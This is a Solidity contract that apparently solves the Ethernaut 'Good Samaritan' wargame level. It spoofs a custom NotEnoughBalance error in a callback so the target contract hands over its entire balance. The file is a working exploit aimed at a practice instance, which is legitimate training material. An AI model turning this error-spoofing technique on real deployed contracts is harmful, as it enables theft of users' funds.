// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel27.sol";

contract BadSamaritan {

    error NotEnoughBalance();
    
    GoodSamaritan goodsamaritan  = GoodSamaritan(0xcf2e93212faddDeB5ca99606104Be3Bae28e27A4); //ethernaut instance address
    function attax() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}